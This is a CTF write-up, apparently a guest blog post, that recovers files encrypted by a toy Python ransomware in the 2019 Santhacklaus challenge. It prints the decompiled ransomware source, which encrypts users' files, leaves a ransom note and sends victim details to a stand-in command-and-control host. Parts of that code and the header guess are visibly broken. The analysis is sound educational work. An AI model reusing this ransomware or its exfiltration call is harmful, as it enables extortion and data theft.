---
title: Santhacklaus 2019: Jacques ! Au secours !
slug: santa-jacques
date: 23/12/2019
---

**Before we start!** This post is authored by [@pwnh4](https://twitter.com/pwnh4).
I'm really proud to have him for this guest post as he started computer security
only a few months ago with my [2019 Piscine](/piscine-poc-2019)
but already performs very well in CTF. Go follow him!

***

*Jacques ! Au secours!* is a cryptography challenge of the Santhacklaus 2019
CTF.

![Intro](/assets/santa/jacques/chall.png)

Let's start by downloading and extracting the provided `.zip` file:

```
➜  chall_files tree
.
├── vacation pictures
│   ├── DCIM-0533.jpg.hacked
│   ├── DCIM-0534.jpg.hacked
│   ├── DCIM-0535.jpg.hacked
│   ├── DCIM-0536.jpg.hacked
│   └── READ_THIS.txt
└── virus.cpython-37.pyc
```

The `.pyc` file is some Python bytecode. It is not human readable so let's
use some [online Python decompiler](https://python-decompiler.com/) to retrive
the actual code source of what looks to be a Python ransomware.

## The Ransomware

```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import hashlib, os, getpass, requests
TARGET_DIR = 'C:\\Users'
C2_URL = 'https://c2.virus.com/'
TARGETS = ['Scott Farquhar', 'Lei Jun', 'Reid Hoffman', 'Zhou Qunfei', 'Jeff Bezos', 'Shiv Nadar', 'Simon Xie', 'Ma Huateng', 'Ralph Dommermuth', 'Barry Lam', 'Nathan Blecharczyk', 'Judy Faulkner', 'William Ding', 'Scott Cook', 'Gordon Moore', 'Marc Benioff', 'Michael Dell', 'Yusaku Maezawa', 'Yuri Milner', 'Bobby Murphy', 'Larry Page', 'Henry Samueli', 'Jack Ma', 'Jen-Hsun Huang', 'Jay Y. Lee', 'Joseph Tsai', 'Dietmar Hopp', 'Henry Nicholas, III.', 'Dustin Moskovitz', 'Mike Cannon-Brookes', 'Robert Miller', 'Bill Gates', 'Garrett Camp', 'Lin Xiucheng', 'Gil Shwed', 'Sergey Brin', 'Rishi Shah', 'Denise Coates', 'Zhang Fan', 'Michael Moritz', 'Robin Li', 'Andreas von Bechtolsheim', 'Brian Acton', 'Sean Parker', 'John Doerr', 'David Cheriton', 'Brian Chesky', 'Wang Laisheng', 'Jan Koum', 'Jack Sheerack', 'Terry Gou', 'Adam Neumann', 'James Goodnight', 'Larry Ellison', 'Wang Laichun', 'Masayoshi Son', 'Min Kao', 'Hiroshi Mikitani', 'Lee Kun-Hee', 'David Sun', 'Mark Scheinberg', 'Yeung Kin-man', 'John Tu', 'Teddy Sagi', 'Frank Wang', 'Robert Pera', 'Eric Schmidt', 'Wang Xing', 'Evan Spiegel', 'Travis Kalanick', 'Steve Ballmer', 'Mark Zuckerberg', 'Jason Chang', 'Lam Wai Ying', 'Romesh T. Wadhwani', 'Liu Qiangdong', 'Jim Breyer', 'Zhang Zhidong', 'Pierre Omidyar', 'Elon Musk', 'David Filo', 'Joe Gebbia', 'Jiang Bin', 'Pan Zhengmin', 'Douglas Leone', 'Hasso Plattner', 'Paul Allen', 'Meg Whitman', 'Azim Premji', 'Fu Liquan', 'Jeff Rothschild', 'John Sall', 'Kim Jung-Ju', 'David Duffield', 'Gabe Newell', 'Scott Lin', 'Eduardo Saverin', 'Jeffrey Skoll', 'Thomas Siebel', 'Kwon Hyuk-Bin']

def get_username():
    return getpass.getuser().encode()

#
# ....
#

def lock_files():
    username = get_username()
    print(username)
    if username in TARGETS:
        for directory, _, filenames in os.walk(TARGET_DIR):
            for filename in filenames:
                if filename.endswith('.hacked'):
                    continue
                fullpath = os.path.join(directory, filename)
                print('Encrypting', fullpath)
                lock_file(fullpath)

        with open(os.path.join(TARGET_DIR, 'READ_THIS.txt'), 'wb') as (fo):
            fo.write('We have hacked all your files. Buy 1 BTC and contact us at hacked@virus.com\n')


if __name__ == '__main__':
    lock_files()

```

The way the ransomware works is pretty simple. It has a list of usernames
defined in `TARGET`. If the victim is one of them, it encrypts his files and
asks for a ransom.

Let's focus on the encryption process:

```python
def xorbytes(a, b):
    assert len(a) == len(b)
    res = ''
    for c, d in zip(a, b):
        res += bytes([c ^ d])

    return res


def lock_file(path):
    # 1
    username = get_username()
    hsh = hashlib.new('md5')
    hsh.update(username)
    key = hsh.digest()
    cip = AES.new(key, 1)

    # 2
    iv = get_random_bytes(16)

    #3
    params = (('target', username), ('path', path), ('iv', iv))
    requests.get(C2_URL, params=params)

    #4
    with open(path, 'rb') as (fi):
        with open(path + '.hacked', 'wb') as (fo):
            block = fi.read(16)
            while 1:
                if block:
                    while 1:
                        if len(block) < 16:
                            block += bytes([0])
                    cipherblock = cip.encrypt(xorbytes(block, iv))
                    iv = cipherblock
                    fo.write(cipherblock)
                    block = fi.read(16)

    os.unlink(path)
```

We can observe multiple interesting things:

1. The key used for encryption is the MD5 hash value of the victim username.
We can also see the declaration of an AES cipher in EBC mode ( `AES.new(key, 1)`)
2. We can see that a variable `IV` is defined. An Initialization vector is used
in AES CBC mode which means that this function is implementing its own AES CBC
encryption. The IV is set to a random 16 bytes value.
3. There is a request to what should be a C&C (useless for our case)
4. The encryption algorithm: for each 16 bytes block of the file to encrypt,
we xor it with the IV and we encrypt the result with the AES ECB cipher defined
in step 1. Then, the result is written in the `.hack` file and the IV is set to
this current encrypted block.

This algorithm is beautifully represented in this Wikipedia schema:

![Wikipedia CBC](/assets/santa/jacques/cbc.png)

## The problem

We can uncipher every block in the `.hack` file except the first one, as it
is the IV that was initialized to a random 16 bytes value.

But luckily we can bypass this! We know that we want to retrieve a JPG files. Thus, we could try to guess the first plaintext block based on the standard header of the JPG format. Let's try with:

```
\xff\xd8\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00
```
An other problem is that we should try all targeted usernames as key. But
let's make some guess and consider that the key is `Jack Sheerack` (because
of the challenge name). We will check the unciphered files generated with
this key first.

Ok, so now that we have solutions for our issues, let's decode the hacked files!

## The script

```python
for target in TARGETS:
    key = hashlib.md5(target.encode()).digest()
    f = sys.argv[1]

    # used to store all 16 bytes block
    blocks = []
    with open(f, "rb") as f:
        while not len(blocks) or len(blocks[-1]):
            blocks.append(f.read(16))
    del blocks[-1]

    cip = AES.new(key, 1)
    with open("/tmp/out-"+target+".jpg", "wb") as fo:
        # write 16 bytes of jpg header
        fo.write(b"\xff\xd8\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00")
        # decode each ith block using the i-1th block as initialization vector
        for i in range(1, len(blocks)):
            fo.write(xorbytes(cip.decrypt(blocks[i]), blocks[i-1]))
```

We try to open the file associated with the `Jack Sheerack` key but it is
invalid. Just like all the other files...

At this time I was quite lost and tried to figure out why my generated JPG
files were invalid.

## Black Magic

After some research, I found the ImageMagick tool, which is great to
help me debug my generated files.

With the `identify` command, you can detect all the corruption sources.

```
➜  identify -regard-warnings -verbose /tmp/out-Jack\ Sheerack.jpg

...
Artifacts:
  filename: /tmp/out-Jack Sheerack.jpg
  verbose: true
Tainted: False
Filesize: 174736B
Number pixels: 990000
Pixels per second: 62.6515MB
User time: 0.010u
Elapsed time: 0:01.015
Version: ImageMagick 6.9.10-67 Q16 x86_64 2019-10-04 https://imagemagick.org
identify: Corrupt JPEG data: 18 extraneous bytes before marker 0xfe `/tmp/out-Jack Sheerack.jpg' @ warning/jpeg.c/JPEGWarningHandler/389.
```

Thats a good thing! Our JPG is corrupted. How is that a good thing? Well now
we know that it is almost valid ! If I try the same thing on a generated file
with the key `Jack Ma`, `identify` simply doesn't work:

```
identify: Unsupported JPEG process: SOF type 0xc3 `/tmp/out-Jack Ma.jpg' @ error/jpeg.c/JPEGErrorHandler/338.
```

At this time I discovered another tool part of the ImageMagick suite:
`mogrify`, which helps correct the corrupted bytes in my generated JPG. I
simply have to indicate the error I want it to correct:

```
➜  mogrify -set comment 'Extraneous bytes removed' /tmp/out-Jack\ Sheerack.jpg

mogrify: Corrupt JPEG data: 18 extraneous bytes before marker 0xfe `/tmp/out-Jack Sheerack.jpg' @ warning/jpeg.c/JPEGWarningHandler/389.
```

I can now open my file and see a wonderful photo of Jacques Chirac!

![Flag](/assets/santa/jacques/flag.jpg)

The picture with the flag was `DCIM-0534.jpg.hacked`.
